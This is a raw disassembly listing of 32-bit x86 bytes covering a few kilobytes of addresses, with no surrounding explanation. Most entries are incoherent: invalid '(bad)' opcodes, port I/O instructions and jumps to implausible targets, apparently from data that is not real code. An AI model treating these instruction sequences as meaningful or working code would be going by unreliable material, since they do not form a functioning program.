  416643:	test   eax,0x88f5a8e7
  416648:	or     al,BYTE PTR [esi]
  41664a:	imul   edi,edi,0xfafadb5c
  416650:	in     eax,dx
  416651:	jg     0x4166be
  416653:	add    esi,DWORD PTR ds:0x13a65ed4
  416659:	xchg   edi,eax
  41665a:	ins    BYTE PTR es:[edi],dx
  41665b:	inc    edx
  41665c:	pop    ecx
  41665d:	jmp    0x4165ee
  41665f:	or     eax,0xf96816a2
  416664:	push   edi
  416665:	addr16 pop ecx
  416667:	cld    
  416668:	push   esp
  416669:	xchg   esi,eax
  41666a:	addr16 pop esi
  41666c:	mov    esp,0xc8e70c98
  416671:	arpl   bp,bx
  416673:	(bad)  
  416674:	xchg   edx,eax
  416675:	push   0x16d28848
  41667a:	call   0xf6d4c715
  41667f:	sar    BYTE PTR [esi-0x6913c52d],1
  416685:	fcomip st,st(3)
  416687:	dec    edx
  416688:	in     al,dx
  416689:	popa   
  41668a:	cmp    al,0x6
  41668c:	(bad)  
  41668d:	sub    eax,0xdd6ed0f7
  416692:	cmp    eax,DWORD PTR [esi-0x75]
  416695:	mov    edx,0xe4e1e88f
  41669a:	sub    cl,cl
  41669c:	push   ebp
  41669d:	xor    DWORD PTR [esi*2-0x6090bede],eax
  4166a4:	lds    esi,FWORD PTR [esi-0x7a3c1892]
  4166aa:	cmp    edx,DWORD PTR ds:[edi+0x62]
  4166ae:	lea    eax,[ecx-0x68]
  4166b1:	jmp    0xe28fa278
  4166b6:	repnz out 0xc1,al
  4166b9:	lea    edx,ds:0x42559dcb
  4166bf:	shl    DWORD PTR [eax],1
  4166c1:	sub    ebp,DWORD PTR [edx]
  4166c3:	push   es
  4166c4:	jge    0x41672d
  4166c6:	jge    0x4166c2
  4166c8:	add    bl,ah
  4166ca:	mov    al,ds:0x1c0441dd
  4166cf:	lods   eax,DWORD PTR ds:[esi]
  4166d0:	ds data16 (bad) 
  4166d3:	mov    esp,0x8c66de19
  4166d8:	and    eax,0x8171c272
  4166dd:	enter  0xb115,0xaf
  4166e1:	jo     0x416734
  4166e3:	sub    edi,DWORD PTR [ebp-0x1f]
  4166e6:	mov    al,0x67
  4166e8:	push   esp
  4166e9:	jnp    0x4166e1
  4166eb:	int    0x5f
  4166ed:	sbb    ebp,edi
  4166ef:	add    bl,cl
  4166f1:	test   al,0x99
  4166f3:	imul   edi,eax,0x833fd460
  4166f9:	sbb    bh,BYTE PTR [esi+eax*8+0x23a9c97a]
  416700:	jl     0x4166d3
  416702:	add    dh,dl
  416704:	aad    0x1c
  416706:	loopne 0x41671d
  416708:	mov    edi,0xa624b374
  41670d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41670e:	jno    0x41670c
  416710:	mov    es,WORD PTR [eax]
  416712:	test   BYTE PTR [esi+0x86300d8],al
  416718:	jns    0x416716
  41671a:	cdq    
  41671b:	sbb    bh,ah
  41671d:	ficomp DWORD PTR [ebx+0x56]
  416720:	jge    0x416739
  416722:	fwait
  416723:	sti    
  416724:	retf   
  416725:	sub    BYTE PTR gs:[ebx+0x2e9d9321],al
  41672c:	cli    
  41672d:	je     0x41675c
  41672f:	mov    ds:0xdfd2d568,eax
  416734:	cmp    ebx,ebx
  416736:	pop    eax
  416737:	ret    0x83e9
  41673a:	jg     0x416790
  41673c:	(bad)  
  41673d:	cs xor esp,ebp
  416740:	pop    ss
  416741:	inc    esi
  416742:	rcr    cl,1
  416744:	test   eax,0xcd004c8b
  416749:	stos   DWORD PTR es:[edi],eax
  41674a:	jns    0x416742
  41674c:	(bad)  
  41674d:	into   
  41674e:	test   al,0xc0
  416750:	push   es
  416751:	cmp    BYTE PTR ds:0x1fceaf79,0xad
  416758:	sahf   
  416759:	(bad)  
  41675a:	out    dx,eax
  41675b:	sti    
  41675c:	xor    ecx,DWORD PTR [esi+0x4a3e6b2e]
  416762:	pop    esp
  416763:	ror    esp,cl
  416765:	jg     0x4166fc
  416767:	(bad)  
  416768:	sbb    al,0xd2
  41676a:	retf   0x42b4
  41676d:	xor    ah,BYTE PTR [ebx]
  41676f:	sar    ebp,cl
  416771:	adc    al,0x51
  416773:	and    eax,0x3ffb86aa
  416778:	loope  0x4167a2
  41677a:	sub    dl,BYTE PTR [ecx-0x10c1243c]
  416780:	jecxz  0x4167de
  416782:	les    esp,FWORD PTR [ebx+0x56f13007]
  416788:	jp     0x416793
  41678a:	sub    esi,ebp
  41678c:	aas    
  41678d:	adc    dl,bl
  41678f:	jecxz  0x4167eb
  416791:	pop    eax
  416792:	addr16 mov ebp,0x9cb995dc
  416798:	add    eax,0xd9325844
  41679d:	pop    edx
  41679e:	inc    esp
  41679f:	or     al,0x5
  4167a1:	cwde   
  4167a2:	xor    al,0x2f
  4167a4:	xor    BYTE PTR [ebp+0x35],ch
  4167a7:	fldcw  WORD PTR [ebx]
  4167a9:	xchg   esi,eax
  4167aa:	test   eax,0xbc7ea4dd
  4167af:	adc    DWORD PTR [eax],0x56e5dcf0
  4167b5:	test   dl,bl
  4167b7:	xchg   edx,eax
  4167b8:	neg    BYTE PTR [esi-0x58]
  4167bb:	aad    0xbe
  4167bd:	push   ecx
  4167be:	dec    ebp
  4167bf:	cmp    eax,0x66
  4167c2:	sbb    ebx,DWORD PTR [ebx]
  4167c4:	xchg   edx,eax
  4167c5:	jp     0x41681a
  4167c7:	sbb    ah,BYTE PTR [edi-0x1a657f84]
  4167cd:	inc    edi
  4167ce:	cdq    
  4167cf:	enter  0x38dd,0x46
  4167d3:	jne    0x416778
  4167d5:	je     0x416783
  4167d7:	shl    edi,cl
  4167d9:	mov    bl,0x2b
  4167db:	inc    ebp
  4167dc:	rcl    BYTE PTR [esi+0x39],1
  4167df:	mov    esp,0xf6016d2e
  4167e4:	test   bh,dl
  4167e6:	test   al,0x9f
  4167e8:	int3   
  4167e9:	aad    0xb9
  4167eb:	dec    esp
  4167ec:	sar    BYTE PTR [ecx],0xa9
  4167ef:	xor    cl,BYTE PTR [ebx+0x38b3e346]
  4167f5:	aam    0xa0
  4167f7:	mov    edx,0xa62c5874
  4167fc:	mov    BYTE PTR [ecx-0x7ba74ff],cl
  416802:	jmp    0x41731f
  416807:	jmp    0x416abf
  41680c:	ds rcl esi,1
  41680f:	int3   
  416810:	(bad)  
  416812:	retf   0x7ed1
  416815:	xchg   ebx,eax
  416816:	aam    0x3d
  416818:	test   DWORD PTR [eax+eax*1-0x41],eax
  41681c:	jbe    0x416841
  41681e:	jg     0x416898
  416820:	xchg   ebp,eax
  416821:	jle    0x41689b
  416823:	js     0x4167d9
  416825:	(bad)  
  416826:	xor    BYTE PTR [edi-0x773e8583],dl
  41682c:	inc    esp
  41682d:	or     eax,0x7dd4b049
  416832:	push   ebp
  416833:	(bad)  
  416834:	scas   eax,DWORD PTR es:[edi]
  416835:	js     0x416825
  416837:	jg     0x4168b5
  416839:	push   ecx
  41683a:	aaa    
  41683b:	cmp    edx,DWORD PTR [edx-0x5]
  41683e:	sbb    esi,DWORD PTR [ecx+0x51]
  416841:	leave  
  416842:	int    0x4e
  416844:	pop    edx
  416845:	mov    ecx,0x1d10878b
  41684a:	and    BYTE PTR [edi-0x7b],0xa2
  41684e:	sub    eax,0x3c425520
  416853:	adc    al,0x1f
  416855:	jle    0x4168af
  416857:	clc    
  416858:	inc    ecx
  416859:	frstor [esi+0x203050f9]
  41685f:	sbb    edx,DWORD PTR [ecx]
  416861:	sub    BYTE PTR [esi-0x38c731bf],dh
  416867:	jmp    0x416855
  416869:	pop    ecx
  41686a:	fimul  DWORD PTR [eax+0x45]
  41686d:	add    ecx,edx
  41686f:	int3   
  416870:	adc    BYTE PTR [ebp+0x13eb690e],al
  416876:	adc    BYTE PTR [esi+ebx*2+0x3d147e8b],0x3f
  41687e:	add    al,0xa
  416880:	xchg   edi,eax
  416881:	xchg   ebx,eax
  416882:	pop    eax
  416883:	dec    edx
  416884:	(bad)  
  416885:	jmp    0x156f15f3
  41688a:	or     esi,edx
  41688c:	jbe    0x416886
  41688e:	xchg   ecx,eax
  41688f:	sbb    DWORD PTR [edi+0x1d],edi
  416892:	mov    ah,0x99
  416894:	enter  0x7893,0x78
  416898:	je     0x41683b
  41689a:	mov    WORD PTR [eax+edx*2+0x977f087],?
  4168a1:	pop    ss
  4168a2:	inc    ebx
  4168a3:	mov    bh,0x15
  4168a5:	imul   BYTE PTR [edi-0x5380428a]
  4168ab:	push   edi
  4168ac:	jl     0x41688f
  4168ae:	scas   al,BYTE PTR es:[edi]
  4168af:	gs mov dh,0x4c
  4168b2:	icebp  
  4168b3:	ret    0x71b2
  4168b6:	sub    al,0xe5
  4168b8:	into   
  4168b9:	ins    DWORD PTR es:[di],dx
  4168bb:	inc    eax
  4168bc:	cwde   
  4168bd:	xor    al,0x10
  4168bf:	retf   0x8701
  4168c2:	or     DWORD PTR [esi-0x71],0xffffff98
  4168c6:	sbb    eax,0x95abf818
  4168cb:	mov    cl,0xa7
  4168cd:	mov    ds:0x8693cf6f,eax
  4168d2:	pusha  
  4168d3:	aam    0x14
  4168d5:	or     eax,0x6a51b75
  4168da:	adc    DWORD PTR [esi+0x1f16e955],eax
  4168e0:	mov    esi,0x29f48484
  4168e5:	jmp    0x41691b
  4168e7:	xor    BYTE PTR [edi],ah
  4168e9:	mul    ebp
  4168eb:	sbb    bh,cl
  4168ed:	popf   
  4168ee:	aad    0x36
  4168f0:	rol    BYTE PTR [edi-0x10e33ddf],0x33
  4168f7:	push   ebp
  4168f8:	test   esp,ebp
  4168fa:	pop    edx
  4168fb:	fisub  WORD PTR [eax-0x58ae1786]
  416901:	shl    BYTE PTR [ebx+ecx*2+0x69],1
  416905:	ins    DWORD PTR es:[edi],dx
  416906:	jmp    0xa0af:0xc9c05399
  41690d:	inc    ebx
  41690e:	lds    eax,FWORD PTR [edx+0x2cbbde86]
  416914:	ins    BYTE PTR es:[edi],dx
  416915:	lds    ebp,FWORD PTR [ecx-0x46]
  416918:	xchg   ecx,eax
  416919:	inc    edx
  41691a:	dec    eax
  41691b:	ret    
  41691c:	jae    0x416968
  41691e:	sub    ecx,esp
  416920:	adc    ch,ah
  416922:	mov    ch,0x39
  416924:	sub    al,0xac
  416926:	out    0x87,eax
  416928:	dec    eax
  416929:	loope  0x41691b
  41692b:	aaa    
  41692c:	add    DWORD PTR [edi+ebx*4],esi
  41692f:	cmp    dl,BYTE PTR [edi]
  416931:	into   
  416932:	inc    ecx
  416933:	das    
  416934:	repz fwait
  416936:	pushf  
  416937:	mov    esi,0x6d32ad83
  41693c:	addr16 inc edx
  41693e:	adc    DWORD PTR [edi-0xf15c21e],esi
  416944:	test   eax,0xb54d8350
  416949:	ret    0x7556
  41694c:	cld    
  41694d:	mov    WORD PTR [ecx],ds
  41694f:	ss aas 
  416951:	inc    eax
  416952:	ret    0x97a2
  416955:	push   cs
  416956:	sbb    BYTE PTR [ebx-0x3ba427de],0x31
  41695d:	(bad)  
  41695e:	pop    ds
  41695f:	dec    esi
  416960:	lds    ecx,FWORD PTR [esi+0x37]
  416963:	xchg   esi,eax
  416964:	mov    bl,0x3c
  416966:	jmp    0x416985
  416968:	(bad)  
  41696a:	mov    al,ds:0x9b9600cf
  41696f:	ins    DWORD PTR es:[edi],dx
  416970:	add    eax,0xf33ee538
  416975:	into   
  416976:	int    0x91
  416978:	lods   al,BYTE PTR ds:[esi]
  416979:	into   
  41697a:	or     ecx,0x31
  41697d:	pop    esi
  41697e:	mov    eax,ds:0x3a264f16
  416983:	inc    eax
  416985:	sub    BYTE PTR [eax],dl
  416987:	iret   
  416988:	out    0xa0,al
  41698a:	mov    ch,0x7f
  41698c:	jmp    0x9ecf33a1
  416991:	test   BYTE PTR [eax-0x77],dh
  416994:	pop    ss
  416995:	dec    esp
  416996:	nop
  416997:	inc    ecx
  416998:	scas   al,BYTE PTR es:[edi]
  416999:	cld    
  41699a:	addr16 xchg edi,eax
  41699c:	mov    ebp,0x831f9760
  4169a1:	stos   DWORD PTR es:[edi],eax
  4169a2:	pop    ebx
  4169a3:	jp     0x416a23
  4169a5:	jmp    0xf306:0x63e5e1cf
  4169ac:	inc    esi
  4169ad:	shr    BYTE PTR [edx+ebp*1+0x2078e696],cl
  4169b4:	popf   
  4169b5:	ja     0x416986
  4169b7:	inc    esi
  4169b8:	inc    edi
  4169b9:	sub    al,0x4b
  4169bb:	or     BYTE PTR [esi+0x274519cd],0xf9
  4169c2:	xchg   ecx,eax
  4169c3:	stos   BYTE PTR es:[edi],al
  4169c4:	imul   eax,edi,0xb9639beb
  4169ca:	cmp    edi,DWORD PTR [eax-0x4e1b5e45]
  4169d0:	daa    
  4169d1:	in     eax,0xd1
  4169d3:	cmp    dh,0x27
  4169d6:	stos   BYTE PTR es:[edi],al
  4169d7:	xor    al,0x7a
  4169d9:	js     0x4169fb
  4169db:	sbb    al,0xf0
  4169dd:	xchg   ebp,eax
  4169de:	cld    
  4169df:	push   ecx
  4169e0:	in     al,dx
  4169e1:	rcr    BYTE PTR cs:[edi+eiz*2+0x39],cl
  4169e6:	stos   BYTE PTR es:[edi],al
  4169e7:	mov    ebx,0x1cf90186
  4169ec:	mov    dl,0xa7
  4169ee:	dec    edx
  4169ef:	ror    BYTE PTR [esi-0x528214b7],cl
  4169f5:	add    al,BYTE PTR [eax]
  4169f7:	or     ebx,DWORD PTR [eax+0x5c]
  4169fa:	mov    ecx,0xfeb4cad6
  4169ff:	jnp    0x416a40
  416a01:	mov    al,0x99
  416a03:	sbb    edx,DWORD PTR [ebx]
  416a05:	mov    dh,0x72
  416a07:	lods   al,BYTE PTR ds:[esi]
  416a08:	sub    edx,DWORD PTR [ecx-0x63]
  416a0b:	aas    
  416a0c:	shr    DWORD PTR [edi],1
  416a0e:	rcl    DWORD PTR [ebx+0x3e2f955a],cl
  416a14:	adc    eax,0xfe9f9688
  416a19:	push   esi
  416a1a:	scas   eax,DWORD PTR es:[edi]
  416a1b:	bound  esi,QWORD PTR [ebx+0x56dbf5e1]
  416a21:	xchg   ebx,eax
  416a22:	or     dl,BYTE PTR [ecx-0x72]
  416a25:	test   DWORD PTR ds:0x9c38d695,eax
  416a2b:	hlt    
  416a2c:	inc    esp
  416a2d:	sbb    esi,DWORD PTR [ebx+edi*4-0x1]
  416a31:	cmp    eax,0xfa0fa560
  416a36:	lea    edx,[esi-0x5f]
  416a39:	mov    edx,0xa34f277d
  416a3e:	cmp    dh,0xce
  416a41:	and    cl,bh
  416a43:	xlat   BYTE PTR ds:[ebx]
  416a44:	push   esp
  416a45:	add    edx,DWORD PTR [edx+0x2d614177]
  416a4b:	cmp    ecx,DWORD PTR [ebx]
  416a4d:	imul   eax,esp,0x822f8314
  416a53:	push   ds
  416a54:	mov    al,ds:0xe216319d
  416a59:	or     ebp,DWORD PTR [ecx+edx*4+0x156c998d]
  416a60:	leave  
  416a61:	pop    es
  416a62:	inc    ecx
  416a63:	bound  edx,QWORD PTR [esp+ebx*1-0xfd3818a]
  416a6a:	pop    esi
  416a6b:	dec    eax
  416a6c:	ficom  DWORD PTR [edi+0x12]
  416a6f:	xchg   edx,eax
  416a70:	std    
  416a71:	inc    esi
  416a72:	fcomp  QWORD PTR [edx]
  416a74:	pusha  
  416a75:	je     0x416a02
  416a77:	xor    edx,ecx
  416a79:	mov    ?,WORD PTR [edi]
  416a7b:	or     edi,DWORD PTR [ebp+0x4e6245c4]
  416a81:	out    0xa3,eax
  416a83:	push   ebp
  416a84:	call   0x678302b
  416a89:	inc    BYTE PTR [ebx-0x4c]
  416a8c:	imul   edx,ebp,0x74d39e8
  416a92:	sbb    BYTE PTR [esi+0x5a41049f],ah
  416a98:	aas    
  416a99:	(bad)  
  416a9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a9b:	sbb    BYTE PTR [ebx+ecx*2+0x13],cl
  416a9f:	loop   0x416ab3
  416aa1:	mov    ds:0xeee63a31,eax
  416aa6:	inc    ecx
  416aa7:	aaa    
  416aa8:	retfw  
  416aaa:	outs   dx,BYTE PTR ds:[esi]
  416aab:	mov    ?,WORD PTR [edi+ebx*1+0x79]
  416aaf:	call   0x27f3:0x7e1931c9
  416ab6:	mov    esi,0x541b6196
  416abb:	sub    esp,DWORD PTR [edi+0x3d]
  416abe:	mov    bh,0x8b
  416ac0:	inc    ebp
  416ac1:	cld    
  416ac2:	jmp    0x416d7a
  416ac7:	rol    dl,1
  416ac9:	(bad)  
  416aca:	iret   
  416acb:	fcmovbe st,st(5)
  416acd:	fcmovne st,st(1)
  416acf:	mov    eax,0x5764ff75
  416ad4:	not    DWORD PTR [edi+0x7f209321]
  416ada:	js     0x416a71
  416adc:	jle    0x416b56
  416ade:	js     0x416aa0
  416ae0:	aad    0x33
  416ae2:	push   0xd94e3edc
  416ae7:	jp     0x416b1e
  416ae9:	hlt    
  416aea:	scas   al,BYTE PTR es:[edi]
  416aeb:	sub    al,0x23
  416aed:	mov    BYTE PTR [ecx-0x33],al
  416af0:	xor    DWORD PTR [ebp-0x567108c9],esi
  416af6:	or     esp,DWORD PTR [esi+0x51]
  416af9:	xchg   bl,ch
  416afb:	pushf  
  416afc:	xchg   edx,eax
  416afd:	adc    BYTE PTR ds:[edi-0xbe5aa71],0x31
  416b05:	ret    0x215e
  416b08:	add    al,0x91
  416b0a:	frstor [ecx]
  416b0c:	addr16 push esp
  416b0e:	jae    0x416a95
  416b10:	mov    edi,0xb2274a56
  416b15:	xlat   BYTE PTR ds:[ebx]
  416b16:	mov    ecx,0x25e640ef
  416b1b:	jne    0x416b63
  416b1d:	arpl   WORD PTR [ecx-0x2775d2a0],sp
  416b23:	xor    DWORD PTR [eax],edx
  416b25:	mov    al,0xd0
  416b27:	in     al,dx
  416b28:	xor    ch,BYTE PTR [ebx+0x2678f94b]
  416b2e:	iret   
  416b2f:	pushf  
  416b30:	mov    al,0x51
  416b32:	addr16 jg 0x416b85
  416b35:	adc    ch,BYTE PTR [edi]
  416b37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b38:	and    eax,0xd1951335
  416b3d:	xchg   ebx,eax
  416b3e:	mov    ds:0x89e4f147,eax
  416b43:	(bad)  
  416b44:	gs lock scas eax,DWORD PTR es:[edi]
  416b47:	out    0x61,al
  416b49:	pusha  
  416b4a:	out    dx,ax
  416b4c:	sbb    ecx,DWORD PTR ds:0xb9a5b0b6
  416b52:	addr16 add al,0xb6
  416b55:	push   0x81e5636c
  416b5a:	sbb    DWORD PTR [esi+eiz*2],ebx
  416b5d:	pop    ebp
  416b5e:	xchg   ecx,eax
  416b5f:	lea    ebp,[edx+0x2f]
  416b62:	stos   DWORD PTR es:[edi],eax
  416b63:	sbb    edx,edi
  416b65:	or     BYTE PTR [edi+0x6fa488fd],al
  416b6b:	xor    DWORD PTR [esi],edi
  416b6d:	fimul  DWORD PTR [ebx+0x31]
  416b70:	repnz mul BYTE PTR [edx]
  416b73:	fisttp DWORD PTR [esi+0x1a]
  416b76:	push   esp
  416b77:	fcom   QWORD PTR [edi-0x2ea4e620]
  416b7d:	test   al,0xf4
  416b7f:	sar    BYTE PTR [edi],0x23
  416b82:	pushf  
  416b83:	lock mov al,0xd
  416b86:	xchg   ebx,eax
  416b87:	jne    0x416b7c
  416b89:	pusha  
  416b8a:	fidivr WORD PTR [esi-0xd8a3242]
  416b90:	sbb    eax,0xced6980c
  416b95:	pop    eax
  416b96:	or     ebp,DWORD PTR [esp+ebp*8-0x3ed62855]
  416b9d:	push   es
  416b9e:	loopne 0x416bed
  416ba0:	out    dx,eax
  416ba1:	je     0x416bb0
  416ba3:	inc    ecx
  416ba4:	loop   0x416b3e
  416ba6:	jmp    0x416b64
  416ba8:	mov    ecx,0x3b45019f
  416bad:	out    dx,al
  416bae:	dec    esi
  416baf:	test   DWORD PTR [edx],edx
  416bb1:	ret    
  416bb2:	shr    BYTE PTR [ebp-0x3fd7af6e],1
  416bb8:	std    
  416bb9:	imul   edi,DWORD PTR [edi-0x5302cc8c],0xfffffffb
  416bc0:	mov    al,0x3d
  416bc2:	es addr16 int 0x88
  416bc6:	out    0x9,al
  416bc8:	jb     0x416c3c
  416bca:	inc    esi
  416bcb:	mov    dl,0xf5
  416bcd:	or     al,0x87
  416bcf:	mov    eax,0x13dbc735
  416bd4:	cld    
  416bd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bd6:	dec    ecx
  416bd7:	mov    ah,BYTE PTR [eax-0x2b6a9d5d]
  416bdd:	int    0xb9
  416bdf:	nop
  416be0:	push   0xb610a646
  416be5:	out    0xd0,al
  416be7:	adc    DWORD PTR [eax],0xffffff86
  416bea:	or     al,BYTE PTR [edi+edx*4]
  416bed:	xchg   ecx,eax
  416bee:	xchg   edi,eax
  416bef:	mov    al,al
  416bf1:	mov    bh,0x92
  416bf3:	sbb    DWORD PTR [eax+0x570bc0c0],ebx
  416bf9:	jecxz  0x416ba4
  416bfb:	jbe    0x416c52
  416bfd:	xchg   ecx,eax
  416bfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bff:	push   es
  416c00:	mov    ch,0xcd
  416c02:	aad    0xbb
  416c04:	xor    al,0xa
  416c06:	call   0xafb4:0x9a15d81d
  416c0d:	aad    0x65
  416c0f:	cs xchg edx,eax
  416c11:	mov    cl,0x91
  416c13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c14:	outs   dx,DWORD PTR ds:[esi]
  416c15:	leave  
  416c16:	sbb    BYTE PTR [ebx],ch
  416c18:	xchg   esp,eax
  416c19:	mov    ds:0x2296ced6,al
  416c1e:	pop    esp
  416c1f:	and    al,0x64
  416c21:	stos   BYTE PTR es:[edi],al
  416c22:	mov    ch,0x62
  416c24:	rcr    DWORD PTR [edi+0x2766d8f6],0xc7
  416c2b:	mov    dh,BYTE PTR ds:0xeb329606
  416c31:	mov    eax,ds:0x3705200b
  416c36:	sbb    bh,BYTE PTR [eax]
  416c38:	outs   dx,DWORD PTR ds:[esi]
  416c39:	aas    
  416c3a:	fadd   st,st(3)
  416c3c:	out    dx,al
  416c3d:	or     edi,DWORD PTR [eax]
  416c3f:	dec    ebx
  416c40:	pop    ds
  416c41:	mov    al,ds:0x812d431d
  416c46:	dec    eax
  416c47:	lahf   
  416c48:	ret    
  416c49:	sbb    BYTE PTR [ebx],al
  416c4b:	leave  
  416c4c:	or     eax,0xdaca0419
  416c51:	retf   
  416c52:	retf   
  416c53:	les    edx,FWORD PTR [eax+0x3dd32414]
  416c59:	adc    edx,DWORD PTR [eax]
  416c5b:	inc    esi
  416c5c:	and    BYTE PTR ds:[ebp+0x4bb10e46],cl
  416c63:	enter  0xbdfd,0x9
  416c67:	sub    eax,0x81e5e05b
  416c6c:	mov    edx,0x82ae9666
  416c71:	and    cl,BYTE PTR [ebx]
  416c73:	and    esi,DWORD PTR [ebx+0x3f6bcf9f]
  416c79:	icebp  
  416c7a:	stc    
  416c7b:	lods   eax,DWORD PTR ds:[esi]
  416c7c:	fwait
  416c7d:	sub    al,dl
  416c7f:	mov    ah,0xfa
  416c81:	cmp    DWORD PTR [ebp+0x4b],ebx
  416c84:	out    0x8f,al
  416c86:	sbb    eax,0x5fbabee5
  416c8b:	mov    esp,0x65a0e456
  416c90:	aam    0xc9
  416c92:	std    
  416c93:	scas   eax,DWORD PTR es:[edi]
  416c94:	xor    eax,0x2e80d6f5
  416c99:	idiv   BYTE PTR [ebx]
  416c9b:	idiv   BYTE PTR [esi+0x5dc556c3]
  416ca1:	test   al,0x55
  416ca3:	clc    
  416ca4:	sub    al,0x30
  416ca6:	adc    al,0x38
  416ca8:	out    dx,al
  416ca9:	fild   WORD PTR [edx+0xa26842d]
  416caf:	int3   
  416cb0:	push   ebx
  416cb1:	xchg   edx,eax
  416cb2:	add    al,dl
  416cb4:	fldcw  WORD PTR [ebx+0x60]
  416cb7:	mov    ?,WORD PTR [ebx+esi*1+0xb]
  416cbb:	xchg   ebx,eax
  416cbc:	xchg   ecx,eax
  416cbd:	les    edi,FWORD PTR [ebp+0xfd5c00b]
  416cc3:	mov    al,0x92
  416cc5:	lahf   
  416cc6:	jl     0x416d0d
  416cc8:	adc    BYTE PTR [ecx+0x579f360f],bl
  416cce:	rcr    DWORD PTR [ebp+edi*8-0x2e],cl
  416cd2:	sub    DWORD PTR [eax+0x9],0x9a9c6367
  416cd9:	stos   DWORD PTR es:[edi],eax
  416cda:	push   ds
  416cdb:	xchg   esi,eax
  416cdc:	outs   dx,BYTE PTR ds:[esi]
  416cdd:	mov    al,0xd
  416cdf:	push   esi
  416ce0:	mov    bh,0x7a
  416ce2:	sbb    dh,dh
  416ce4:	pop    esp
  416ce5:	mov    al,0xf9
  416ce7:	imul   ebp,ebx,0x7f746143
  416ced:	xor    al,ch
  416cef:	xlat   BYTE PTR ds:[ebx]
  416cf0:	sub    DWORD PTR [esi-0x49],edi
  416cf3:	mov    DWORD PTR [ebp+0x0],0x44a03381
  416cfa:	stos   BYTE PTR es:[edi],al
  416cfb:	div    BYTE PTR [edx-0x7c338534]
  416d01:	scas   al,BYTE PTR es:[edi]
  416d02:	mov    al,ds:0xf9508b20
  416d07:	mov    eax,ds:0x357189d4
  416d0c:	cmp    al,BYTE PTR [ebp-0x1f]
  416d0f:	inc    ebp
  416d10:	fcmovb st,st(3)
  416d12:	pop    eax
  416d13:	mov    al,0xc3
  416d15:	and    dl,BYTE PTR [edi+0x4a2a5db3]
  416d1b:	ret    0xe025
  416d1e:	pop    edi
  416d1f:	jns    0x416cef
  416d21:	inc    esi
  416d22:	enter  0x7319,0x5f
  416d26:	jp     0x416d9e
  416d28:	jl     0x416d89
  416d2a:	(bad)
  416d2e:	dec    ecx
  416d2f:	imul   eax,DWORD PTR [edx-0x28f07532],0x3a
  416d36:	hlt    
  416d37:	enter  0xa311,0x1c
  416d3b:	cmp    BYTE PTR [eax+0x15054073],0xe2
  416d42:	int3   
  416d43:	mov    dh,0x78
  416d45:	push   ebp
  416d46:	ror    DWORD PTR [ebx+0x13],1
  416d49:	sbb    eax,0xe308d8d8
  416d4e:	dec    esp
  416d4f:	xor    DWORD PTR [eax-0x61],ebp
  416d52:	(bad)  
  416d53:	into   
  416d54:	and    ebx,ebx
  416d56:	adc    DWORD PTR [ebp+0x1bd72c02],ebp
  416d5c:	push   0xbcd7fe9c
  416d61:	cmp    BYTE PTR [eax],ch
  416d63:	addr16 out dx,al
  416d65:	sub    al,0x34
  416d67:	sti    
  416d68:	push   ebx
  416d69:	push   edx
  416d6a:	out    0x65,al
  416d6c:	cmc    
  416d6d:	test   eax,0x5f3bb6c
  416d72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d73:	adc    ebx,eax
  416d75:	xchg   ebp,eax
  416d76:	iret   
  416d77:	mov    esi,cs
  416d79:	mov    dh,0x8b
  416d7b:	dec    ebp
  416d7c:	adc    BYTE PTR [ebx],dh
  416d7e:	mov    DWORD PTR [ebx],0xfc13bc6
  416d84:	test   DWORD PTR [ebx-0x74fffffb],edx
  416d8a:	inc    ebp
  416d8b:	cld    
  416d8c:	xor    eax,edi
  416d8e:	add    eax,esi
  416d90:	mov    ds:0x41eb6a,eax
  416d95:	mov    eax,DWORD PTR [ebp-0x4]
  416d98:	xor    eax,edi
  416d9a:	jmp    0x417052
  416d9f:	xlat   BYTE PTR ds:[ebx]
  416da0:	cmp    eax,0xd9dac7cc
  416da5:	fcmovne st,st(5)
  416da7:	push   ecx
  416da8:	call   0x69fd:0xd3d11efb
  416daf:	sub    BYTE PTR ds:0x7e95787f,ah
  416db5:	js     0x416e2f
  416db7:	sti    
  416db8:	outs   dx,BYTE PTR ds:[esi]
  416db9:	retf   0xd767
  416dbc:	cmp    al,0xc2
  416dbe:	push   ebx
  416dbf:	inc    eax
  416dc0:	repz fld QWORD PTR es:[edi+eiz*4-0x10]
  416dc6:	inc    ecx
  416dc7:	mov    esi,0x5d0f2fd5
  416dcc:	xor    al,0x75
  416dce:	or     eax,0xd44ea8c0
  416dd3:	pop    esi
  416dd4:	or     bh,dh
  416dd6:	jne    0x416da6
  416dd8:	int3   
  416dd9:	or     DWORD PTR [ebp-0x18],esp
  416ddc:	out    dx,al
  416ddd:	mov    eax,0xf646f389
  416de2:	aaa    
  416de3:	imul   edi,DWORD PTR [ebp-0x4f],0xffffff96
  416de7:	add    dl,BYTE PTR ss:[edi+0x37]
  416deb:	hlt    
  416dec:	dec    esi
  416ded:	fs jecxz 0x416d9e
  416df0:	stos   BYTE PTR es:[edi],al
  416df1:	leave  
  416df2:	ror    DWORD PTR [ebx-0x4d95f4e1],cl
  416df8:	ja     0x416e56
  416dfa:	pop    esp
  416dfb:	iret   
  416dfc:	out    dx,al
  416dfd:	sub    bl,BYTE PTR [ebx+0x61e26df]
  416e03:	fld    st(5)
  416e05:	ins    DWORD PTR es:[edi],dx
  416e06:	pop    ebp
  416e07:	jmp    0x81d6:0x3a3f42c8
  416e0e:	or     BYTE PTR [esp+eiz*4],0xe1
  416e12:	pop    eax
  416e13:	or     edi,ebp
  416e15:	imul   edx,DWORD PTR [esi+0x5b],0x5
  416e19:	enter  0xf12b,0x2
  416e1d:	lahf   
  416e1e:	pop    esp
  416e1f:	nop
  416e20:	add    DWORD PTR [esi+ecx*1],edi
  416e23:	loop   0x416dbc
  416e25:	in     eax,dx
  416e26:	push   esi
  416e27:	pop    edi
  416e28:	jle    0x416e5b
  416e2a:	sub    al,cl
  416e2c:	pop    eax
  416e2d:	icebp  
  416e2e:	in     al,0x2f
  416e30:	sub    al,0xb2
  416e32:	arpl   WORD PTR [edi+0x54],dx
  416e35:	or     cl,BYTE PTR [edi+edx*4-0x41]
  416e39:	ins    DWORD PTR es:[edi],dx
  416e3a:	test   al,0xfb
  416e3c:	xor    al,0x74
  416e3e:	enter  0xd077,0xdd
